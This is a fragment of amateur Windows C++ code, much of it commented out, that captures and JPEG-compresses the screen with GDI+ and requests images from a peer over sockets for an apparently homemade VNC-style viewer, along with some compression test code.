   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   
   quality = 25;
  
   encoderParameters.Parameter[0].Value = &quality;
   sendData(VNCSocks[ID],"GetImage",strlen("GetImage"));
  ProcessingImage=1;
   char * input=new char[1000];
   input=recvData(VNCSocks[ID]); //times out 
   cout<<"MesageBack:"<<input<<endl;
   if (!strncmp(input,"SendingData",strlen("SendingData"))){
	   cout<<"Woot getting my image bitch"<<endl;
	
   char * AciiNum=new char[1000];
   AciiNum=recvData(VNCSocks[ID]);
   cout<<"Number of bytes to allocate:"<<AciiNum<<endl;
   ULARGE_INTEGER ulnSize;
   ulnSize.QuadPart=atol(AciiNum);
   char * Imagebuffer=new char[ulnSize.QuadPart];
   Imagebuffer=recvData(VNCSocks[ID]);

     IStream* FreshStream=NULL;
CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
     ULONG ulBytesRead;
FreshStream->Write(Imagebuffer,ulnSize.QuadPart,&ulBytesRead);
cout<<"Read Byte:"<<ulBytesRead<<endl;
FreshImage=new Image(FreshStream);





   }else{
	   cout << "Crap!"<<endl;
   IStream* FreshStream=NULL;
   }
   ProcessingImage=0;
        
 //  GdiplusShutdown(gdiplusToken);
return FreshImage; 
}
*/







/* BASE CODE FOR SCREEN SAVE AND GUI 
#include <windows.h>
#include <objidl.h>
#include <string>
#include <iostream>
#include <gdiplus.h>
#include <string.h>
using namespace Gdiplus;
#pragma comment (lib,"Gdiplus.lib")
INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);  // helper function
Image* ImageCaptureAndCompress();
RECT rect;
HWND                hWnd;
int width=10;
int height=10;



     BITMAP bm;
    HDC dc;
    HDC Cdc;
    int cx;
    int cy;
VOID OnPaint(HDC hdc)
{
    
    GetWindowRect(hWnd, &rect);

  int width = rect.right - rect.left;
  int height = rect.bottom - rect.top;


 Graphics *graphics=new Graphics(hdc);
 Image* Mydisplay= ImageCaptureAndCompress();
 graphics->DrawImage(Mydisplay,0,0,width,height);
  


}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, PSTR, INT iCmdShow){



}

INT WINAPI mooo(HINSTANCE hInstance, HINSTANCE, PSTR, INT iCmdShow)
{
   
   MSG                 msg;
   WNDCLASS            wndClass;                                                
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR           gdiplusToken;
   


   // Initialize GDI+.
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
   
   wndClass.style          = CS_HREDRAW | CS_VREDRAW;
   wndClass.lpfnWndProc    = WndProc;
   wndClass.cbClsExtra     = 0;
   wndClass.cbWndExtra     = 0;
   wndClass.hInstance      = hInstance;
   wndClass.hIcon          = LoadIcon(NULL, IDI_APPLICATION);
   wndClass.hCursor        = LoadCursor(NULL, IDC_ARROW);
   wndClass.hbrBackground  = (HBRUSH)GetStockObject(WHITE_BRUSH);
   wndClass.lpszMenuName   = NULL;
   wndClass.lpszClassName  = TEXT("GettingStarted");
   
   RegisterClass(&wndClass);
   
 
     dc=GetDC(NULL);
     Cdc=CreateCompatibleDC(dc);
     cx=GetSystemMetrics(SM_CXSCREEN);
     cy=GetSystemMetrics(SM_CYSCREEN);
   hWnd = CreateWindow(
      TEXT("GettingStarted"),   // window class name
      TEXT("Getting Started"),  // window caption
      WS_OVERLAPPEDWINDOW,      // window style
      CW_USEDEFAULT,            // initial x position
      CW_USEDEFAULT,            // initial y position
      CW_USEDEFAULT,            // initial x size
      CW_USEDEFAULT,            // initial y size
      NULL,                     // parent window handle
      NULL,                     // window menu handle
      hInstance,                // program instance handle
      NULL);                    // creation parameters
      
   ShowWindow(hWnd, iCmdShow);
   UpdateWindow(hWnd);
   
   while(GetMessage(&msg, NULL, 0, 0))
   {
      TranslateMessage(&msg);
      DispatchMessage(&msg);
   }
   
   GdiplusShutdown(gdiplusToken);
   return msg.wParam;
}  // WinMain

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, 
   WPARAM wParam, LPARAM lParam)
{
   HDC          hdc;
   PAINTSTRUCT  ps;
   
   switch(message)
   {
   case WM_PAINT:
      hdc = BeginPaint(hWnd, &ps);
      OnPaint(hdc);
      EndPaint(hWnd, &ps);
      return 0;
   case WM_DESTROY:
      PostQuitMessage(0);
      return 0;
   default:
      return DefWindowProc(hWnd, message, wParam, lParam);
   }
}


Image* ImageCaptureAndCompress(){


     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
    HBITMAP hMymap=CreateCompatibleBitmap(dc,cx,cy);
    SelectObject(Cdc,hMymap);
    BitBlt(Cdc, 0,0, cx, cy, dc,0,0,SRCCOPY);
    GetObject(hMymap,sizeof(bm),&bm);
    Graphics *mgraphics=new Graphics(dc);
    Image* image= new Bitmap(hMymap,NULL);
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;

   quality = 25;
   encoderParameters.Parameter[0].Value = &quality;
   


  IStream* MyPstream=NULL;

HRESULT hr =CreateStreamOnHGlobal(NULL, TRUE, &MyPstream);

    
stat = image->Save(MyPstream, &encoderClsid, &encoderParameters);

ULARGE_INTEGER ulnSize;
LARGE_INTEGER lnOffset;
lnOffset.QuadPart = 0;
if(MyPstream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) != S_OK)
{
    MyPstream->Release();
    
}

// now move the pointer to the beginning of the file

if(MyPstream->Seek(lnOffset, STREAM_SEEK_SET, NULL) != S_OK)
{
    MyPstream->Release();
 
}

 void *ConvertImage=NULL;
  char *pBuff = new char[ulnSize.QuadPart];

        // Read the stream directly into the buffer
        ULONG ulBytesRead;
        if(MyPstream->Read(pBuff, ulnSize.QuadPart, &ulBytesRead) != S_OK)
        {
            MyPstream->Release();
         
        }
        //After reading it to what it needs to be read to then send
    int    Mycount=ulBytesRead;

   IStream* FreshStream=NULL;
hr =CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
FreshStream->Write(pBuff,ulnSize.QuadPart,&ulBytesRead);

Image* FreshImage=new Image(FreshStream);
delete image;
DeleteObject(mgraphics);
DeleteObject(hMymap);
 //  GdiplusShutdown(gdiplusToken);
 return FreshImage;  
}

//HEREHEHREHRHEHRHEHRHERHERHEHRHERHEHRHEHRHEHREHHEHRHEHRHEHEHRHERHRHEHERHREH


/*
	
     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
   cout<<"running"<<endl;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   
   quality = 25;
   sendData(VNCSocks[ID],"GetImage",strlen("GetImage"));
   encoderParameters.Parameter[0].Value = &quality;
   ProcessingImage=1;
   char * input=new char[1000];
   input=recvData(VNCSocks[ID]); //times out 
   cout<<"MesageBack:"<<input<<endl;
   if (!strncmp(input,"SendingData",strlen("SendingData"))){
	   cout<<"Woot getting my image bitch"<<endl;
	
   char * AciiNum=new char[1000];
   AciiNum=recvData(VNCSocks[ID]);
   cout<<"Number of bytes to allocate:"<<AciiNum<<endl;
   ULARGE_INTEGER ulnSize;
   ulnSize.QuadPart=atol(AciiNum);
   char * Imagebuffer=new char[ulnSize.QuadPart];
   Imagebuffer=recvData(VNCSocks[ID]);

     IStream* FreshStream=NULL;
CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
     ULONG ulBytesRead;
FreshStream->Write(Imagebuffer,ulnSize.QuadPart,&ulBytesRead);
cout<<"Read Byte:"<<ulBytesRead<<endl;
FreshImage=new Image(FreshStream);





   }else{
	   cout << "Crap!"<<endl;
   IStream* FreshStream=NULL;
   }
   ProcessingImage=0;
        
 //  GdiplusShutdown(gdiplusToken);
return FreshImage; 
}


	//destin=NULL;
	int err=TestCompress( destin, &durp,TestComp, testlen) ;
	cout<<"Err:"<<err<<endl;
	if (err==-5){
		cout<<"Here:"<<durp<<endl;
		delete [] destin;
		destin=new unsigned char[durp];
		err=TestCompress( destin, &durp,TestComp, testlen) ;
		cout<<"Err:"<<err<<endl;
	}else{
		cout<<"No Here"<<endl;


	}
	// now uncompress 
	err=TestUncompress(uncompress,&durp2,destin, durp);
	
	cout<<"Err:"<<err<<endl;
	if (err==-5){
		cout<<"Here:"<<durp2<<" AND : "<<durp<<endl;
		delete [] uncompress;
		//durp2=durp2;
		uncompress=new unsigned char[durp2];
		err=TestUncompress( uncompress,&durp2,destin,durp) ;
		cout<<"Err:"<<err<<endl;
	}else{
		cout<<"No Here"<<endl;


	}
	char display[100];
	uncompress[durp2]='\0';
	cout<<uncompress<<"VS "<<TestComp<<endl;
	if (!strcmp((char*)uncompress,(char*)TestComp)){

		printf("WOOT\n");


	}else if(!strncmp((char*)uncompress,(char*)TestComp,testlen-1)){

		char *Checker=new char[10];
		printf("Expected.\n");
		memmove(Checker,(char*)uncompress,10);
		cout<<"CMON:"<<Checker<<endl;
	}else{

		cout<<"Booo"<<endl;


	}

/*
TO DO:
Change/Add NetworkCode and add in Ability to transfer images
*/